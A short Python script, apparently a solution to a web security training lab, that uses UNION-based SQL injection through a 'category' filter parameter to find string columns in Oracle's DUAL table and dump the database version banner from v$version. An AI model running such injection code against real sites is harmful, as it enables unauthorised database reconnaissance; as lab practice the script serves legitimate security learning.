#!/usr/bin/env python3
"""SQL injection attack, querying the database type and version on Oracle"""

import bs4

import lab_05


class Lab(lab_05.Lab):
    """Wrapper"""

    @staticmethod
    def parse_html_table(response_text: str) -> list:
        """parse usernames and passwords from HTML"""
        soup = bs4.BeautifulSoup(response_text, features="lxml")
        table = soup.find("table", attrs={"class": "is-table-longdescription"})
        rows = table.tbody.find_all("tr")
        return [row.th.text for row in rows]


def main() -> None:
    """Entry point"""
    site = Lab(key="category", path="/filter")
    if site.columns_of_string_type(table="DUAL") != [0, 1]:
        raise RuntimeError(f"Expected [0, 1]; got {site.columns_of_string_type()}")
    response = site.dump_table(["BANNER", "NULL"], table="v$version")
    version = "\n".join(site.parse_html_table(response.text))
    print(version)


if __name__ == "__main__":
    main()
